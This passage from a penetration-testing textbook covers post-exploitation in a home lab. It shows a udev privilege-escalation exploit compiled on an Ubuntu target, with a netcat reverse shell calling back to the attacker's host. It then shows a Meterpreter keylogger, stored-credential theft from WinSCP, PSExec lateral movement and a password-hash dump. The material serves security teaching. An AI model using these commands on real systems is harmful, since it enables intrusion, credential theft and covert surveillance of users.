Codename: intrepid</pre></div></div><p>The Linux target is running Linux kernel 2.6.27-2 and Ubuntu 8.10, codename <span class="emphasis"><em>Intrepid</em></span>. This Linux system is a bit out of date and is vulnerable <a class="indexterm" id="iddle1591"/><a class="indexterm" id="iddle1622"/><a class="indexterm" id="iddle2115"/><a class="indexterm" id="iddle2324"/><a class="indexterm" id="iddle2355"/>to multiple known privilege-escalation issues. We’ll focus on an issue in <span class="emphasis"><em>udev</em></span>, the device manager for the Linux kernel that is in charge of loading device drivers, or software that facilitates control of a device.</p><p>Vulnerability CVE-2009-1185 describes an issue in udev where the daemon, which runs with root privileges, fails to check whether requests to load drivers originate from the kernel. Processes in user space, such as ones that a user starts, can send messages to udev and convince it to run code with root privileges.</p><p>According to the <span class="emphasis"><em>SecurityFocus.com</em></span> entry for this vulnerability, Ubuntu 8.10 is an affected platform, and further digging reveals that udev versions 141 and earlier are affected by this issue. We can check the udev version on our target with the command <code class="literal">udevadm --version</code>, but we can’t run the command with the privileges afforded by <span class="emphasis"><em>www-data</em></span>. Instead, we need to run it from our SSH shell as shown here.</p><a id="pro_id00152"/><pre class="programlisting">georgia@ubuntu:~$ <span class="strong"><strong>udevadm --version</strong></span>&#13;
124</pre><p>The udev version on our target, 124, is earlier than 141, which tells us that our Linux target is vulnerable.</p></div><div class="sect3" title="Finding an Exploit"><div class="titlepage"><div><div><h4 class="title" id="finding_an_exploit">Finding an Exploit</h4></div></div></div><p>Kali Linux includes a local repository of public exploit code from <span class="emphasis"><em>Exploitdb.com</em></span> at <span class="emphasis"><em>/usr/share/exploitdb</em></span>, which includes a utility called <code class="literal">searchsploit</code> that we can use to search for useful code. For example, <a class="xref" href="ch13.xhtml#searching_the_exploitdb_repository" title="Example 13-13. Searching the Exploitdb repository">Example 13-13</a> shows the results of a search for exploits related to udev.</p><div class="example"><a id="searching_the_exploitdb_repository"/><div class="example-title">Example 13-13. Searching the Exploitdb repository</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>/usr/share/exploitdb/searchsploit udev</strong></span>&#13;
 Description                                                           Path&#13;
---------------------------------------------------------------------- ----------------------&#13;
Linux Kernel 2.6 UDEV Local Privilege Escalation Exploit               /linux/local/8478.sh&#13;
Linux Kernel 2.6 UDEV &lt; 141 Local Privilege Escalation Exploit         /linux/local/8572.c&#13;
Linux udev Netlink Local Privilege Escalation                          /linux/local/21848.rb</pre></div></div><p>There appear to be multiple public exploits for this issue. Let’s use the second exploit, <span class="emphasis"><em>/usr/share/exploitdb/platforms/linux/local/8572.c</em></span>.</p><div class="note" title="Note"><h3 class="title"><a id="ch13note03"/>Note</h3><p>Always be sure that you fully understand what public exploit code does before running it against a target. Additionally, there is always a chance that a public exploit won’t run reliably on the target. If possible, set up a lab machine, and test the quality of the exploit before you try it on the client target.</p></div><p>One of the great things about this exploit is that it’s well commented and provides detailed usage information. <a class="xref" href="ch13.xhtml#udev_exploit_usage_information" title="Example 13-14. Udev exploit usage information">Example 13-14</a> shows an excerpt from its C code, which includes usage details.</p><div class="example"><a id="udev_exploit_usage_information"/><div class="example-title">Example 13-14. Udev exploit usage information</div><div class="example-contents"><pre class="programlisting">* Usage:&#13;
*   Pass the PID of the udevd netlink socket (listed in /proc/net/netlink,&#13;
*   usually is the udevd PID minus 1) as argv[1].&#13;
*   The exploit will execute /tmp/run as root so throw whatever payload you&#13;
*   want in there.</pre></div></div><p><a class="indexterm" id="iddle1433"/><a class="indexterm" id="iddle1435"/><a class="indexterm" id="iddle1445"/><a class="indexterm" id="iddle1619"/><a class="indexterm" id="iddle2452"/>We learn that we need to pass the PID of the udev netlink socket as an argument to our exploit. The usage information tells us to look for this value in <span class="emphasis"><em>/proc/net/netlink</em></span>, usually as udev PID minus 1. We also see that the exploit will run whatever code it finds in the file <span class="emphasis"><em>/tmp/run</em></span> as root, so we need to put some code there.</p></div><div class="sect3" title="Copying and Compiling the Exploit on the Target"><div class="titlepage"><div><div><h4 class="title" id="copying_and_compiling_the_exploit_on_the">Copying and Compiling the Exploit on the Target</h4></div></div></div><p>First we need to copy the exploit to our target and compile it so that it can run. Luckily, the GCC C compiler is preinstalled on most Linux distributions, so you can often compile local exploit code directly on the target. To find out if GCC is installed, enter <span class="strong"><strong><code class="literal">gcc</code></strong></span> as shown here.</p><a id="pro_id00153"/><pre class="programlisting">georgia@ubuntu:~$ <span class="strong"><strong>gcc</strong></span>&#13;
gcc: no input files</pre><p>As you can see, GCC complains that it’s not been given any input, but this tells us that GCC is present. Now to copy our exploit code to the Linux target. The Linux <code class="literal">wget</code> command lets us use the command line to pull a file down from a web server, so let’s copy the C code to our Kali Linux web server as shown here. Make sure the apache2 webserver is running in Kali.</p><a id="pro_id00154"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>cp /usr/share/exploitdb/platforms/linux/local/8572.c /var/www</strong></span></pre><p>Now switch to your SSH shell, and download the file with <code class="literal">wget</code>, as shown in <a class="xref" href="ch13.xhtml#using_wget_to_download_a_file" title="Example 13-15. Using wget to download a file">Example 13-15</a>.</p><div class="example"><a id="using_wget_to_download_a_file"/><div class="example-title">Example 13-15. Using <code class="literal">wget</code> to download a file</div><div class="example-contents"><pre class="programlisting">georgia@ubuntu:~$ <span class="strong"><strong>wget http://192.168.20.9/8572.c</strong></span>&#13;
--2015-08-14 14:30:51--  http://192.168.20.9/8572.c&#13;
Connecting to 10.0.1.24:80... connected.&#13;
HTTP request sent, awaiting response... 200 OK&#13;
Length: 2768 (2.7K) [text/x-csrc]&#13;
Saving to: `8572.c'&#13;
&#13;
100%[======================================&gt;] 2,768       --.-K/s   in 0s&#13;
&#13;
2015-08-14 14:30:52 (271 MB/s) - `8572.c' saved [2768/2768]</pre></div></div><p>Now compile the exploit code with GCC on the Linux target as shown here. Use the <code class="literal">-o</code> flag to specify an output file name for your compiled code.</p><a id="pro_id00155"/><pre class="programlisting">georgia@ubuntu:~$ <span class="strong"><strong>gcc -o exploit 8572.c</strong></span></pre><p><a class="indexterm" id="iddle1618"/><a class="indexterm" id="iddle1629"/><a class="indexterm" id="iddle2003"/><a class="indexterm" id="iddle2310"/>Now to find that udev netlink socket PID mentioned in the exploit’s usage information (<a class="xref" href="ch13.xhtml#udev_exploit_usage_information" title="Example 13-14. Udev exploit usage information">Example 13-14</a>) for our argument. The usage information noted that the PID we need is listed in <span class="emphasis"><em>/proc/net/netlink</em></span>. <code class="literal">cat</code> out the file, as shown in <a class="xref" href="ch13.xhtml#solidusprocsolidusnetsolidusnetlink_file" title="Example 13-16. The /proc/net/netlink file">Example 13-16</a>.</p><div class="example"><a id="solidusprocsolidusnetsolidusnetlink_file"/><div class="example-title">Example 13-16. The /proc/net/netlink file</div><div class="example-contents"><pre class="programlisting">georgia@ubuntu:~$ <span class="strong"><strong>cat /proc/net/netlink</strong></span>&#13;
sk       Eth Pid     Groups   Rmem     Wmem     Dump     Locks&#13;
f7a90e00 0   5574    00000111 0        0        00000000 2&#13;
da714400 0   6476    00000001 0        0        00000000 2&#13;
da714c00 0   4200780 00000000 0        0        00000000 2&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
f7842e00 15  2468    00000001 0        0        00000000 2&#13;
f75d5c00 16  0       00000000 0        0        00000000 2&#13;
f780f600 18  0       00000000 0        0        00000000 2</pre></div></div><p>There’s more than one PID listed, but we know that the PID we need is usually the PID of the udev daemon minus 1. Look at the udev process with the <code class="literal">ps aux</code> command, as shown here.</p><a id="pro_id00156"/><pre class="programlisting">georgia@ubuntu:~$ <span class="strong"><strong>ps aux | grep udev</strong></span>&#13;
root      2469  0.0  0.0   2452   980 ?        S&lt;s  02:27   0:00 /sbin/udevd --daemon&#13;
georgia   3751  0.0  0.0   3236   792 pts/1    S+   14:36   0:00 grep udev</pre><p>The udev daemon’s PID is 2469. One of the PIDs from <a class="xref" href="ch13.xhtml#solidusprocsolidusnetsolidusnetlink_file" title="Example 13-16. The /proc/net/netlink file">Example 13-16</a> is 2468 (udev’s PID minus 1). Based on the exploit’s help information, this is the value we need. This value is going to change between reboots of the Ubuntu target, so make sure you run these commands in your own lab to find the correct value.</p></div><div class="sect3" title="Adding Code to the /tmp/run File"><div class="titlepage"><div><div><h4 class="title" id="adding_code_to_the_solidustmpsolidusrun">Adding Code to the /tmp/run File</h4></div></div></div><p>The last thing we need is some code to be run as root in the file <span class="emphasis"><em>/tmp/run</em></span>. Luckily, we also have Netcat installed on our Ubuntu system by default, so we can create a simple Bash script to connect back to a listener on our Kali system, as discussed in <a class="xref" href="ch02.xhtml" title="Chapter 2. Using Kali Linux">Chapter 2</a>. Here’s the script.</p><a id="pro_id00157"/><pre class="programlisting">georgia@ubuntu:~$ <span class="strong"><strong>cat /tmp/run</strong></span>&#13;
#!/bin/bash&#13;
nc 192.168.20.9 12345 -e /bin/bash</pre><p>Before running our exploit, we need to set up a listener on our Kali system to catch the incoming Netcat shell.</p><a id="pro_id00158"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>nc -lvp 12345</strong></span>&#13;
listening on [any] 12345 ...</pre><p><a class="indexterm" id="iddle1510"/><a class="indexterm" id="iddle1636"/><a class="indexterm" id="iddle1714"/><a class="indexterm" id="iddle1973"/><a class="indexterm" id="iddle2112"/><a class="indexterm" id="iddle2454"/>Finally, we’re ready to run our compiled exploit. Remember to pass the PID of the udev netlink socket we found earlier as an argument.</p><a id="pro_id00159"/><pre class="programlisting">georgia@ubuntu:~$ <span class="strong"><strong>./exploit 2468</strong></span></pre><p>Nothing seems to happen on the Linux target, but if you turn back to the Netcat listener on Kali, we have a connection. The <code class="literal">whoami</code> command tells us we now have root privileges, as shown in <a class="xref" href="ch13.xhtml#gaining_root_privileges" title="Example 13-17. Gaining root privileges">Example 13-17</a>.</p><div class="example"><a id="gaining_root_privileges"/><div class="example-title">Example 13-17. Gaining root privileges</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>nc -lvp 12345</strong></span>&#13;
listening on [any] 12345 ...&#13;
192.168.20.11: inverse host lookup failed: Unknown server error : Connection timed out&#13;
connect to [192.168.20.9] from (UNKNOWN) [192.168.20.11] 33191&#13;
<span class="strong"><strong>whoami</strong></span>&#13;
root</pre></div></div><p>We’ve successfully escalated our privileges using a public exploit.</p></div></div></div><div class="sect1" title="Local Information Gathering"><div class="titlepage"><div><div><h2 class="title" id="local_information_gathering" style="clear: both">Local Information Gathering</h2></div></div></div><p>Once we gain access to a system we should see if any potentially sensitive information is present, such as installed software that stores passwords in plaintext or using a weak hashing algorithm, proprietary data or source code, customer credit card information, or the CEO’s email account. These are all useful bits of information to present in the final report to the customer. Additionally, any information we find may help us break into other systems in the network that hold even greater spoils.</p><p>We will look at moving from system to system later in this chapter, but for now let’s look at a few interesting ways to find information on the local system.</p><div class="sect2" title="Searching for Files"><div class="titlepage"><div><div><h3 class="title" id="searching_for_files">Searching for Files</h3></div></div></div><p>We can tell Meterpreter to search for interesting files. For example in <a class="xref" href="ch13.xhtml#using_meterpreter_to_look_for_files" title="Example 13-18. Using Meterpreter to look for files">Example 13-18</a>, I tell Meterpreter to look for any filenames that contain the name <span class="emphasis"><em>password</em></span>.</p><div class="example"><a id="using_meterpreter_to_look_for_files"/><div class="example-title">Example 13-18. Using Meterpreter to look for files</div><div class="example-contents"><pre class="programlisting">meterpreter &gt; <span class="strong"><strong>search -f *password*</strong></span>&#13;
Found 8 results...&#13;
    c:\\WINDOWS\Help\password.chm (21891 bytes)&#13;
    c:\\xampp\passwords.txt (362 bytes)&#13;
    c:\\xampp\php\PEAR\Zend\Dojo\Form\Element\PasswordTextBox.php (1446 bytes)&#13;
    c:\\xampp\php\PEAR\Zend\Dojo\View\Helper\PasswordTextBox.php (1869 bytes)&#13;
    c:\\xampp\php\PEAR\Zend\Form\Element\Password.php (2383 bytes)&#13;
    c:\\xampp\php\PEAR\Zend\View\Helper\FormPassword.php (2942 bytes)&#13;
    c:\\xampp\phpMyAdmin\user_password.php (4622 bytes)&#13;
    c:\\xampp\phpMyAdmin\libraries\display_change_password.lib.php (3467 bytes)</pre></div></div></div><div class="sect2" title="Keylogging"><div class="titlepage"><div><div><h3 class="title" id="keylogging">Keylogging</h3></div></div></div><p><a class="indexterm" id="iddle1223"/><a class="indexterm" id="iddle1598"/><a class="indexterm" id="iddle1599"/><a class="indexterm" id="iddle1711"/><a class="indexterm" id="iddle1970"/><a class="indexterm" id="iddle1971"/><a class="indexterm" id="iddle2251"/><a class="indexterm" id="iddle2353"/><a class="indexterm" id="iddle2356"/><a class="indexterm" id="iddle2497"/>Another way to gather information is to let the logged-in user give it to you, so to speak. Meterpreter has a keylogger we can use to listen for keystrokes. Perhaps the user is logging in to websites or other systems on the network while our Meterpreter session is active. Start the keylogger on the Windows XP Meterpreter session by entering <span class="strong"><strong><code class="literal">keyscan_start</code></strong></span>, as shown here.</p><a id="pro_id00160"/><pre class="programlisting">meterpreter &gt; <span class="strong"><strong>keyscan_start</strong></span>&#13;
Starting the keystroke sniffer...</pre><div class="note" title="Note"><h3 class="title"><a id="ch13note04"/>Note</h3><p>You will capture keystrokes only in your current context. For my example, I used my original Windows XP session where I am the user <span class="emphasis"><em>georgia</em></span> in the <span class="emphasis"><em>explorer.exe</em></span> process, and thus can sniff <span class="emphasis"><em>georgia</em></span>’s keystrokes. Another interesting idea is to migrate into the winlogon process, where you will see only login information that is typed—certainly useful information.</p></div><p>Now switch to Windows XP, and type something. In my example I typed <span class="smaller">CTRL</span>-R to open the Run dialog. Then I entered <code class="literal">notepad.exe</code> to start the Notepad program and typed <code class="literal">hi georgia</code> into Notepad.</p><p>To see any keystrokes the keylogger has logged, enter <span class="strong"><strong><code class="literal">keyscan_dump</code></strong></span> as shown here. As you can see, all of the keystrokes I typed were logged.</p><a id="pro_id00161"/><pre class="programlisting">meterpreter &gt; <span class="strong"><strong>keyscan_dump</strong></span>&#13;
Dumping captured keystrokes...&#13;
 &lt;LWin&gt; notepad.exe &lt;Return&gt; hi georgia &lt;Return&gt;</pre><p>To stop the keylogger, enter <span class="strong"><strong><code class="literal">keyscan_stop</code></strong></span> in Meterpreter as shown here.</p><a id="pro_id00162"/><pre class="programlisting">meterpreter &gt; <span class="strong"><strong>keyscan_stop</strong></span>&#13;
Stopping the keystroke sniffer...</pre></div><div class="sect2" title="Gathering Credentials"><div class="titlepage"><div><div><h3 class="title" id="gathering_credentials">Gathering Credentials</h3></div></div></div><p>In <a class="xref" href="ch09.xhtml" title="Chapter 9. Password Attacks">Chapter 9</a>, we worked with password hashes from Windows, Linux, and the FileZilla FTP server, but users may have other stored credentials on their local system. Metasploit has several post modules for gathering passwords for specific software in <span class="emphasis"><em>/usr/share/metasploit-framework/modules/post/windows/gather/credentials</em></span>. For our example, we will look at stealing stored credentials from WinSCP, a secure copy tool for Windows.</p><p>As shown in <a class="xref" href="ch13.xhtml#connecting_with_winscp" title="Figure 13-1. Connecting with WinSCP">Figure 13-1</a>, open WinSCP, set the File protocol to <span class="strong"><strong>SCP</strong></span>, the Host name to the IP address of the Ubuntu target, and the credentials to <span class="emphasis"><em>georgia:password</em></span>. Click <span class="strong"><strong>Save As</strong></span> under the login information.</p><div class="figure"><a id="connecting_with_winscp"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00115"/><img alt="Connecting with WinSCP" src="httpatomoreillycomsourcenostarchimages2030420.png.jpg"/></div></div><div class="figure-title">Figure 13-1. Connecting with WinSCP</div></div><div class="note" title="Note"><h3 class="title"><a id="ch13note05"/>Note</h3><p><a class="indexterm" id="iddle1902"/><a class="indexterm" id="iddle2100"/>Like some of the other tools used in this book, the WinSCP GUI may be updated in the future, so your version may not look exactly like this.</p></div><p>You will be prompted for a session name, as shown in <a class="xref" href="ch13.xhtml#saving_credentials_in_winscp" title="Figure 13-2. Saving credentials in WinSCP">Figure 13-2</a>. Check the <span class="strong"><strong>Save password</strong></span> box before clicking <span class="strong"><strong>OK</strong></span>. Even WinSCP warns you that saving passwords is a bad idea.</p><div class="figure"><a id="saving_credentials_in_winscp"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00116"/><img alt="Saving credentials in WinSCP" src="httpatomoreillycomsourcenostarchimages2030422.png.jpg"/></div></div><div class="figure-title">Figure 13-2. Saving credentials in WinSCP</div></div><p><a class="indexterm" id="iddle1225"/><a class="indexterm" id="iddle1640"/><a class="indexterm" id="iddle1806"/><a class="indexterm" id="iddle1811"/><a class="indexterm" id="iddle2250"/><a class="indexterm" id="iddle2352"/>Now switch back to Kali Linux, and use the module <span class="emphasis"><em>post/windows/gather/credentials/winscp</em></span>, as shown in <a class="xref" href="ch13.xhtml#stealing_stored_credentials_from_winscp" title="Example 13-19. Stealing stored credentials from WinSCP">Example 13-19</a>. Because this is a post module, the only option you will need to supply is the ID of the Windows XP session.</p><div class="example"><a id="stealing_stored_credentials_from_winscp"/><div class="example-title">Example 13-19. Stealing stored credentials from WinSCP</div><div class="example-contents"><pre class="programlisting">msf &gt; <span class="strong"><strong>use post/windows/gather/credentials/winscp</strong></span>&#13;
msf  post(winscp) &gt; <span class="strong"><strong>show options</strong></span>&#13;
&#13;
Module options (post/windows/gather/credentials/winscp):&#13;
&#13;
   Name     Current Setting  Required  Description&#13;
   ----     ---------------  --------  -----------&#13;
   SESSION                   yes       The session to run this module on.&#13;
&#13;
msf  post(winscp) &gt; <span class="strong"><strong>set session 1</strong></span>&#13;
session =&gt; 1&#13;
msf  post(winscp) &gt; <span class="strong"><strong>exploit</strong></span>&#13;
[*] Looking for WinSCP.ini file storage...&#13;
[*] WinSCP.ini file NOT found...&#13;
[*] Looking for Registry Storage...&#13;
[*] Host: 192.168.20.9  Port: 22 Protocol: SSH  Username: georgia  Password: password ❶&#13;
[*] Done!&#13;
[*] Post module execution completed</pre></div></div><p>As shown in <a class="xref" href="ch13.xhtml#stealing_stored_credentials_from_winscp" title="Example 13-19. Stealing stored credentials from WinSCP">Example 13-19</a>, the module discovers our saved credentials ❶. Based on the software your pentesting targets are running, there may be other credential-gathering targets that will come in handy in the field.</p></div><div class="sect2" title="net Commands"><div class="titlepage"><div><div><h3 class="title" id="net_commands">net Commands</h3></div></div></div><p>The Windows <code class="literal">net</code> command will allow us to view and edit network information. Using various options, we can gain valuable information. Drop to a Windows command shell using the Meterpreter command shell, as shown here.</p><a id="pro_id00163"/><pre class="programlisting">meterpreter &gt; <span class="strong"><strong>shell</strong></span>&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.&#13;
C:\Windows\system32&gt;</pre><p>The command <code class="literal">net users</code> will show us all local users. Tacking on the word <code class="literal">/domain</code> at the end of this and many <code class="literal">net</code> commands will show information about the domain rather than the local system, but because our targets are not joined to a domain, we’ll stick with <code class="literal">net users</code>.</p><a id="pro_id00164"/><pre class="programlisting">C:\Windows\system32&gt; <span class="strong"><strong>net users</strong></span>&#13;
net users&#13;
User accounts for \\&#13;
------------------------------------------------------------------------------&#13;
Administrator           georgia           secret           Guest</pre><p><a class="indexterm" id="iddle1004"/><a class="indexterm" id="iddle1105"/><a class="indexterm" id="iddle1807"/><a class="indexterm" id="iddle2005"/><a class="indexterm" id="iddle2196"/><a class="indexterm" id="iddle2326"/>We can also see the members of a group with the command <code class="literal">net</code> <code class="literal">localgroup</code> <span class="emphasis"><em><code class="literal">group</code></em></span> as shown in <a class="xref" href="ch13.xhtml#viewing_local_administrators_with_net_co" title="Example 13-20. Viewing local administrators with net commands">Example 13-20</a>.</p><div class="example"><a id="viewing_local_administrators_with_net_co"/><div class="example-title">Example 13-20. Viewing local administrators with <code class="literal">net</code> commands</div><div class="example-contents"><pre class="programlisting">C:\Windows\system32&gt; <span class="strong"><strong>net localgroup Administrators</strong></span>&#13;
net localgroup Administrators&#13;
Alias name     Administrators&#13;
Comment        Administrators have complete and unrestricted access to the computer/domain&#13;
Members&#13;
-----------------------------------------------------------------------------------------------&#13;
Administrator&#13;
georgia&#13;
secret&#13;
The command completed successfully.</pre></div></div><p>To exit the shell and drop back into Meterpreter, type <code class="literal">exit</code>.</p><p>These are just a couple of examples of useful <code class="literal">net</code> commands. We’ll look at using <code class="literal">net</code> commands to add a user later in this chapter.</p></div><div class="sect2" title="Another Way In"><div class="titlepage"><div><div><h3 class="title" id="another_way_in">Another Way In</h3></div></div></div><p>In <a class="xref" href="ch05.xhtml" title="Chapter 5. Information Gathering">Chapter 5</a>, we used Nmap to run a UDP scan. By definition, UDP scans are not as exact as TCP scans. For example, port 69/UDP on the Windows XP target, traditionally the port for TFTP, returned <code class="literal">open|filtered</code> in our UDP Nmap scan. Because our scan did not receive any response, it was unclear if anything was listening there at all. Short of fuzzing the TFTP server and possibly crashing it, it would be difficult to ascertain which TFTP software, if any, is running. Now that we have access to the system, we can further investigate running software for any vulnerabilities we may have missed.</p><div class="note" title="Note"><h3 class="title"><a id="ch13note06"/>Note</h3><p>Earlier in the chapter we used the Meterpreter <code class="literal">ps</code> command to view all running processes on the Windows XP target. One of these is 3CTftpSvc.exe, an older version of the 3Com TFTP service that is subject to a buffer overflow condition in the TFTP long transport mode. (We’ll write an exploit for this issue by hand in <a class="xref" href="ch19.xhtml" title="Chapter 19. Fuzzing, Porting Exploits, and Metasploit Modules">Chapter 19</a>, but there’s a Metasploit module for this issue as well.) Though it would be difficult for an attacker to identify this issue remotely, the software is still vulnerable, and we should include it in our pentest report.</p></div><p>It may be that you won’t discover a network-facing vulnerability until after you have gained access to the system. Without sending random TFTP input to the server and analyzing the results, it would be difficult for us to find this issue.</p></div><div class="sect2" title="Checking Bash History"><div class="titlepage"><div><div><h3 class="title" id="checking_bash_history">Checking Bash History</h3></div></div></div><p>One place to look for potentially interesting information on a Linux system is in a user’s Bash history. When a Bash shell is closed, the commands that have been executed are written to a file called <span class="emphasis"><em>.bash_history</em></span> in the user’s <a class="indexterm" id="iddle1020"/><a class="indexterm" id="iddle1280"/><a class="indexterm" id="iddle1388"/><a class="indexterm" id="iddle1606"/><a class="indexterm" id="iddle1608"/><a class="indexterm" id="iddle1907"/><a class="indexterm" id="iddle1972"/><a class="indexterm" id="iddle2006"/><a class="indexterm" id="iddle2468"/>home directory. A perhaps rather contrived example where the user’s password is saved in plaintext in the Bash history file is shown here.</p><a id="pro_id00165"/><pre class="programlisting">georgia@ubuntu:~$ <span class="strong"><strong>cat .bash_history</strong></span>&#13;
my password is password&#13;
--<span class="emphasis"><em>snip</em></span>--</pre></div></div><div class="sect1" title="Lateral Movement"><div class="titlepage"><div><div><h2 class="title" id="lateral_movement" style="clear: both">Lateral Movement</h2></div></div></div><p>Once we have access to one system in a networked environment, can we use it to access additional systems and their sensitive data? If our exploited system is a member of a domain, we can certainly try to compromise a domain account or ideally get domain administrator access so that we can log in to and manage all systems in the domain.</p><p>But even if you can’t get control of a domain, you may still be able to access the systems in that domain if they were all installed from the same system install image with the same local administrator password that has never been changed. If we can crack this password for one machine, we may be able to log in to many machines in the environment without domain access. Also, if a user has an account on multiple systems, he or she may use the same password on each system, which might allow us to log in with credentials we found elsewhere in the environment. (Good password policies help prevent these kinds of vulnerabilities, but passwords are often the weakest link, even in high-security environments.)</p><p>Let’s look at a few techniques for turning access to one system into access to many.</p><div class="sect2" title="PSExec"><div class="titlepage"><div><div><h3 class="title" id="psexec">PSExec</h3></div></div></div><p>The PSExec technique originated in the Sysinternals Windows management tool set in the late 1990s. The utility worked by using valid credentials to connect to the ADMIN$ share on the Windows XP SMB server. PSExec uploads a Windows service executable to the ADMIN$ share and then connects to the Windows Service Control Manager using remote procedure call (RPC) to start the executable service. The service then sets up an SMB named <code class="literal">pipe</code> to send commands and remotely control the target system.</p><p>The Metasploit module <span class="emphasis"><em>exploit/windows/smb/psexec</em></span> implements a very similar technique. The module requires a running SMB server on the target and credentials that give access to the ADMIN$ share.</p><p>In <a class="xref" href="ch09.xhtml" title="Chapter 9. Password Attacks">Chapter 9</a>, we cracked the password hashes for users on our Windows XP target. You can probably imagine using the found credentials and PSExec to gain access to additional systems. Use the credentials <span class="emphasis"><em>georgia:password</em></span> with the PSExec module, as shown in <a class="xref" href="ch13.xhtml#using_the_psexec_module" title="Example 13-21. Using the PSExec module">Example 13-21</a>.</p><div class="example"><a id="using_the_psexec_module"/><div class="example-title">Example 13-21. Using the PSExec module</div><div class="example-contents"><pre class="programlisting">msf &gt; <span class="strong"><strong>use exploit/windows/smb/psexec</strong></span>&#13;
msf exploit(psexec) &gt; <span class="strong"><strong>show options</strong></span>&#13;
&#13;
Module options (exploit/windows/smb/psexec):&#13;
&#13;
   Name       Current Setting  Required  Description&#13;
   ----       ---------------  --------  -----------&#13;
   RHOST                       yes       The target address&#13;
   RPORT      445              yes       Set the SMB service port&#13;
   SHARE      ADMIN$           yes       The share to connect to, can be an admin share&#13;
                                           (ADMIN$,C$,...) or a normal read/write folder share&#13;
   SMBDomain  WORKGROUP        no        The Windows domain to use for authentication&#13;
   SMBPass                     no        The password for the specified username&#13;
   SMBUser                     no        The username to authenticate as&#13;
&#13;
msf exploit(psexec) &gt; <span class="strong"><strong>set RHOST 192.168.20.10</strong></span>&#13;
RHOST =&gt; 10.0.1.13&#13;
msf exploit(psexec) &gt; <span class="strong"><strong>set SMBUser georgia</strong></span>❶&#13;
SMBUser =&gt; georgia&#13;
msf exploit(psexec) &gt; <span class="strong"><strong>set SMBPass password</strong></span>❷&#13;
SMBPass =&gt; password&#13;
msf exploit(psexec) &gt; <span class="strong"><strong>exploit</strong></span>&#13;
[*] Started reverse handler on 192.168.20.9:4444&#13;
[*] Connecting to the server...&#13;
[*] Authenticating to 192.168.20.10:445|WORKGROUP as user 'georgia'...&#13;
[*] Uploading payload...&#13;
[*] Created \KoMknErc.exe...&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
[*] Meterpreter session 6 opened (192.168.20.9:4444 -&gt; 192.168.20.10:1173) at 2015-08-14 14:13:40 -0400</pre></div></div><p><a class="indexterm" id="iddle2277"/>In addition to <code class="literal">RHOST</code>, we need to tell the module which SMBDomain, SMBUser, and SMBPass to use. Our Windows XP target is not a member of a domain, so we can leave the SMBDomain option at the default, <code class="literal">WORKGROUP</code>.</p><p>Set SMBUser to <code class="literal">georgia</code> ❶ and SMBPass to <code class="literal">password</code> ❷, our discovered credentials. Then run the exploit module. The module embeds the chosen payload (in this case, the default <span class="emphasis"><em>windows/meterpreter/reverse_tcp</em></span>) into a Windows service image executable. After uploading the executable and contacting Windows Service Control Manager, the service copies the shellcode into executable memory for the service process and redirects execution to the payload. Thus our payload runs and connects back to our Metasploit listener on Kali. Even though we logged on as the user <span class="emphasis"><em>georgia</em></span>, because our payload is running as a system service, our session automatically has system privileges.</p><div class="note" title="Note"><h3 class="title"><a id="ch13note07"/>Note</h3><p>This is why we made the change to the Windows XP Security Policy in <a class="xref" href="ch01.xhtml" title="Chapter 1. Setting Up Your Virtual Lab">Chapter 1</a>. If Windows XP were a member of a domain, we could fill in the SMBDomain option and use PSExec to get System access on any system where the domain user was a local administrator. This is a great way to move around a network looking for interesting information, additional password hashes, and more vulnerabilities.</p></div></div><div class="sect2" title="Pass the Hash"><div class="titlepage"><div><div><h3 class="title" id="pass_the_hash">Pass the Hash</h3></div></div></div><p><a class="indexterm" id="iddle1460"/><a class="indexterm" id="iddle1469"/><a class="indexterm" id="iddle1879"/><a class="indexterm" id="iddle1891"/><a class="indexterm" id="iddle1983"/><a class="indexterm" id="iddle2007"/><a class="indexterm" id="iddle2058"/>Our previous attack relied on our ability to reverse the password hash and gain access to the plaintext password for a user account. Of course, in the case of our Windows XP target, this is trivial because it uses the entirely crackable LM hashing algorithm.</p><p>In <a class="xref" href="ch09.xhtml" title="Chapter 9. Password Attacks">Chapter 9</a>, we learned that when we have only the NTLM user authentication hash of a password, instead of the weaker LM version, our ability to reverse the hash in a reasonable amount of time depends on the weakness of the password, the strength of our wordlist, and even the algorithms employed by the password-cracking program. If we can’t reverse the password hash, we’re going to have a tough time logging in to other systems with the plaintext credentials.</p><p>PSExec comes to the rescue again. When a user logs in over SMB, his or her password is not sent to the target in plaintext. Instead, the target system issues a challenge that can be answered only by someone with the correct password. In this case, the answer to the challenge is the LM- or NTLM-hashed password, depending on the implementation.</p><p>When you log in to a remote system, your Windows application calls a utility to hash the password, and that hash is sent to the remote system for authentication. The remote system assumes that if you send the correct hash, you must have access to the correct plaintext password—that is, after all, one of the fundamentals of one-way hash functions. Can you think of a scenario where you might have access to password hashes but not the plaintext passwords?</p><p>In <a class="xref" href="ch09.xhtml" title="Chapter 9. Password Attacks">Chapter 9</a>, we were able to reverse all password hashes on our target systems. Additionally, on our Windows XP target, we were able to reverse the LM hashes regardless of the strength of the password. But let’s simulate a situation where we have only password hashes, as shown with the Meterpreter <code class="literal">hashdump</code> command in <a class="xref" href="ch13.xhtml#using_hashdump" title="Example 13-22. Using hashdump">Example 13-22</a>.</p><div class="example"><a id="using_hashdump"/><div class="example-title">Example 13-22. Using <code class="literal">hashdump</code></div><div class="example-contents"><pre class="programlisting">meterpreter &gt; <span class="strong"><strong>hashdump</strong></span>&#13;
Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::&#13;
georgia:1003:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::&#13;
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&#13;
HelpAssistant:1000:93880b42019f250cd197b67718ac9a3d:86da9cefbdedaf62b66d9b2fe8816c1f:::&#13;
secret:1004:e52cac67419a9a22e1c7c53891cb0efa:9bff06fe611486579fb74037890fda96:::&#13;
